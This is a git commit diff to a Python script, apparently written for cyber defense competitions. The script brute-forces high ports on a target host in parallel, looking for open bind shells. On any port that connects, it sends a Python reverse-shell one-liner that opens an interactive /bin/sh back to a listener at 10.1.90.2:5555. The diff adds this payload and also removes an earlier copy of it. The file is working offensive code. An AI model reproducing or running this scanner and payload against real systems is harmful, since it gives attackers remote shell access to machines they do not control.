76abc96344d9a3834bbdec0f818f4edb4d98ba7f
Aaron Tekippe <atekippe@hotmail.com>
2018-09-02 22:33:30 -0500

    working with multiprocessing.  Pretty quick.  Launches python revese shell.

--- brute_bind_shells.py
+++ brute_bind_shells.py
@@ -3,13 +3,37 @@ Many times in CDCs there are random bind shells on high ports.
 This script will attempt to brute force which port the bind shell
 is on and run a command if successful.
 '''
+
 import socket
 import sys
+from multiprocessing import Pool
+
+
+def hunt_bind_shells(r_port):
+    l_host = '10.1.90.2'
+    l_port = '5555'
+    # create a new socket
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    python3_reverse = "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"" + l_host + "\"," + l_port + "));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'\n"
+    try:
+        s.connect((host, r_port))
+        print(green + "Winner {0} {1}".format(host, r_port) + end_color)
+        print(blue + "Go get your Shellz!" + end_color)
+        s.send(python3_reverse.encode())
+
+        data = s.recv(1024)
+
+        print(data)
+        s.close()
+        exit()
+
+    except socket.error as e:
+        print(red + "{0} {1} ".format(host, r_port) + str(e) + end_color)
 
 
 if __name__ == '__main__':
-    if len(sys.argv) != 2:
-        print('Usage: python3 ' + sys.argv[0] + ' host')
+    if len(sys.argv) != 3:
+        print('Usage: python3 ' + sys.argv[0] + ' host threads')
         sys.exit(0)
 
     # Declare some colors to use
@@ -21,22 +45,10 @@ if __name__ == '__main__':
 
     # Assign arguments to more meaningful variables
     host = sys.argv[1]
+    threads = int(sys.argv[2])
 
-    for i in range(50000, 65535):
-        # create a new socket
-        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        buffer = "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.1.90.2\",5555));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'\n"
-        try:
-            s.connect((host, i))
-            print(green + "Winner {0} {1}".format(host, i) + end_color)
-            print(blue + "Go get your Shellz!" + end_color)
-            s.send(buffer.encode())
+    with Pool(threads) as p:
+        p.map(hunt_bind_shells, range(50000, 65535))
 
-            data = s.recv(1024)
 
-            print(data)
-            s.close()
-
-        except socket.error as e:
-            print(red + "{0} {1} ".format(host, i) + str(e) + end_color)
 
